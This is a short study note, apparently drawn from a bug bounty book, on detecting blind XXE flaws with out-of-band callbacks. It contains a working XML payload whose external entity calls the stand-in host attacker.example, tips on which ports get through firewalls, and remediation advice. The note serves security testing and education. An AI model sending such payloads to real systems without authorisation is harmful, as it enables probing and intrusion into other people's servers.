# Blind XXE OOB Detection

- Blind XXE is useful when the application parses XML but does not return parser output.
- Confirm outbound entity resolution by referencing a unique URL on a server you control.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker.example:80/xxe_test.txt">
]>
<example>&test;</example>
```
- Monitor web/server logs for a request to `/xxe_test.txt`.
- Test ports `80` and `443` first because outbound firewalls commonly permit web traffic.
- The same listener approach used for blind SSRF applies here.
- A callback confirms external entity/network access but not necessarily arbitrary file exfiltration.
- Remediation: disable external entities and restrict outbound network access from XML-processing components.
## Source: Bug Bounty Bootcamp, Ch. 15
